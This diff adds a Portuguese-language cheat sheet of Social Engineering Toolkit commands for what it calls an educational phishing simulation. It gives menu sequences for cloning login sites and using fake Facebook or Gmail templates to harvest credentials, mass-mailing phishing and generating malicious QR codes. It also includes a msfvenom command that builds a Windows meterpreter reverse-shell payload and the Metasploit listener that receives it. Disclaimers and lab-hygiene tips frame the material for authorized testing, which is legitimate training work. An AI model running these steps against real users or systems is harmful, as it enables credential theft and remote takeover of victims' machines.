@@ -1,0 +1,185 @@
+================================================================================
+COMANDOS DO SOCIAL ENGINEERING TOOLKIT (SET)
+Projeto: Phishing - Simulação Educacional
+Data: Dezembro 2025
+================================================================================
+
+NOTA: Estes comandos são apenas para referência educacional. Use apenas em 
+ambientes autorizados e controlados.
+
+================================================================================
+1. INICIALIZAR O SET
+================================================================================
+
+# Iniciar o Social Engineering Toolkit
+sudo python3 /usr/share/set/setoolkit
+
+# Ou via pip (se instalado)
+setoolkit
+
+
+================================================================================
+2. ATAQUES DE PHISHING NO SET
+================================================================================
+
+Menu Principal:
+1 - Social Engineering Attacks
+2 - Penetration Testing (Fast-Track)
+3 - Third Party Modules
+4 - Update the Social-Engineer Toolkit
+5 - Update SET configuration
+6 - Help, Credits, and About
+
+Seleção de Ataque:
+1 - Spear Phishing Attack Vector
+2 - Website Attack Vectors
+3 - Infectious Media Generator
+4 - Create a Payload and Listener
+5 - Mass Mailer Attack
+6 - Arduino-Based Attack Vector
+7 - Wireless Access Point Attack Vector
+8 - QRCode Generator Attack Vector
+9 - Powershell Attack Vectors
+10 - Third Party Modules
+
+================================================================================
+3. CREDENTIAL HARVESTER (Website Attack)
+================================================================================
+
+# Sequência de menu para coletor de credenciais:
+1 (Social Engineering Attacks)
+2 (Website Attack Vectors)
+3 (Credential Harvester Attack Method)
+2 (Site Cloner)
+
+# Configuração:
+- IP do servidor: [seu IP local, ex: 192.168.1.100]
+- URL alvo: [URL a clonar, ex: https://login.exemplo.com]
+- Protocolo: http ou https
+
+
+================================================================================
+4. FAKE LOGIN PAGE (Página de Login Falsa)
+================================================================================
+
+# Sequência:
+1 (Social Engineering Attacks)
+2 (Website Attack Vectors)
+1 (Credential Harvester Attack Method)
+1 (Web Templates)
+
+# Selecionar templates pré-configurados como:
+- Facebook
+- Gmail
+- Twitter
+- Linkedin
+- etc.
+
+
+================================================================================
+5. INICIAR SERVIDOR LOCAL
+================================================================================
+
+# Python 2 (versão legada)
+python -m SimpleHTTPServer 80
+
+# Python 3 (recomendado)
+python3 -m http.server 80
+
+# Php
+php -S localhost:80
+
+# No SET, o servidor é iniciado automaticamente durante a configuração
+
+
+================================================================================
+6. CAPTURA DE CREDENCIAIS
+================================================================================
+
+# As credenciais são capturadas em tempo real durante a execução
+# Arquivo de log típico: /root/.set/logs/
+
+# Visualizar credenciais capturadas:
+cat /root/.set/logs/credentials.txt
+
+
+================================================================================
+7. FERRAMENTAS COMPLEMENTARES
+================================================================================
+
+# Gerar código QR malicioso:
+1 (Social Engineering Attacks)
+8 (QRCode Generator Attack Vector)
+
+# Criar payloads:
+1 (Social Engineering Attacks)
+4 (Create a Payload and Listener)
+
+# Phishing via email em massa:
+1 (Social Engineering Attacks)
+5 (Mass Mailer Attack)
+
+
+================================================================================
+8. CONFIGURAÇÃO DE LISTENER (Para reverso shell)
+================================================================================
+
+# Gerar payload:
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o payload.exe
+
+# Configurar listener no Metasploit:
+msfconsole
+> use exploit/multi/handler
+> set PAYLOAD windows/meterpreter/reverse_tcp
+> set LHOST 192.168.1.100
+> set LPORT 4444
+> run
+
+
+================================================================================
+9. DICAS DE SEGURANÇA DURANTE O TESTE
+================================================================================
+
+✓ Use máquinas virtuais isoladas
+✓ Crie snapshots antes de começar
+✓ Não conecte à internet real
+✓ Use redes isoladas (private network)
+✓ Documente todos os passos
+✓ Destrua os dados capturados após o teste
+✓ Obtenha autorização escrita
+
+
+================================================================================
+10. LIMPEZA APÓS O TESTE
+================================================================================
+
+# Parar o servidor SET
+Ctrl + C
+
+# Limpar logs de credenciais
+rm /root/.set/logs/credentials.txt
+
+# Restaurar máquina ao estado anterior
+# (Use snapshot da VM)
+
+
+================================================================================
+REFERÊNCIAS E RECURSOS
+================================================================================
+
+- Documentação SET: https://www.social-engineer.org/framework/
+- Guia Ético: https://www.sans.org/reading-room/
+- Certificações: OSCP, CEH, GPEN
+- Comunidade: Open Security Research
+
+
+================================================================================
+AVISO LEGAL
+================================================================================
+
+O uso não autorizado dessas técnicas é ILEGAL. Use apenas em ambientes 
+autorizados para fins educacionais e de teste de segurança.
+
+Responsabilidade total do usuário por qualquer uso impróprio.
+
+================================================================================
